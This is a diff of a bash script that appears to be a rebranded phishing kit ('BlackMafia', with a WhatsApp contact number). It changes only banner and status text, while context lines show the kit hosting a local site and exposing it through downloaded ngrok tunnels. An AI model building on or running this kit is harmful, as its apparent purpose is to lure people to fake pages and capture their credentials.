@@ -71,10 +71,10 @@ banner_mafia() {
 	cat <<- EOF
 ${ORANGE} 
 ${ORANGE} ████████████████████████████████████████████████ 
-${ORANGE} █ ${RED}___  _  _ _ ____ _  _ _ _  _ ____ ${MAGENTA}BlackMafia  ${ORANGE}█
-${ORANGE} █ ${RED}|__] |__| | [__  |__| | |\ | | __ ${MAGENTA}WhatsApp    ${ORANGE}█
-${ORANGE} █ ${RED}|    |  | | ___] |  | | | \| |__] ${MAGENTA}03094161457 ${ORANGE}█
-${ORANGE} █                                                   ${ORANGE}█
+${ORANGE} █ ${RED}___  _  _ _ ____ _  _ _ _  _ ____ ${MAGENTA}BlackMafia ${ORANGE}█
+${ORANGE} █ ${RED}|__] |__| | [__  |__| | |\ | | __ ${MAGENTA}WhatsApp   ${ORANGE}█
+${ORANGE} █ ${RED}|    |  | | ___] |  | | | \| |__] ${MAGENTA}03094161457${ORANGE}█
+${ORANGE} █                                               ${ORANGE}█
 ${ORANGE} ████████████████████████████████████████████████
 	EOF
 }
@@ -132,7 +132,7 @@ install_ngrok() {
 	if [[ -e ".server/ngrok" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} Installing ngrok..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} BlackMafia Installing..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip' 'ngrok'
@@ -148,7 +148,7 @@ install_ngrok() {
 	if [[ -e ".server/ngrok2" ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok patch already installed."
 	else
-		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} Installing ngrok patch..."${WHITE}
+		echo -e "\n${GREEN}[${WHITE}Plz Wait${GREEN}]${CYAN} BlackMafia Server Installing..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
 			download_ngrok 'https://bin.equinox.io/a/e93TBaoFgZw/ngrok-2.2.8-linux-arm.zip' 'ngrok2'
@@ -173,12 +173,11 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} BlackMafia 
-                ${GREEN} WhatsApp 
-                ${RED} 03094161457
-		${RED} Main Menu     
-                ${RED} Exit
-
+${GREEN} BlackMafia 
+${GREEN} WhatsApp 
+${RED} 03094161457
+${RED} Main Menu     
+${RED} Exit
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
@@ -248,7 +247,7 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} BlackMafia Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} $2"
 	sleep 2 && ./.server/"$1" http "$HOST":"$PORT" > /dev/null 2>&1 &
@@ -262,7 +261,7 @@ start_ngrok() {
 
 ## Start localhost
 start_localhost() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} BlackMafia Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
 	{ sleep 1; clear; banner_mafia; }
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
@@ -285,7 +284,7 @@ tunnel_menu() {
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		start_localhost
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		start_ngrok "ngrok" "Launching Ngrok... Turn on Hotspot..."
+		start_ngrok "ngrok" "Launching Ngrok...${MAGENTA} Turn on Hotspot..."
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		start_ngrok "ngrok2" "Launching Ngrok Patched..."
 	else
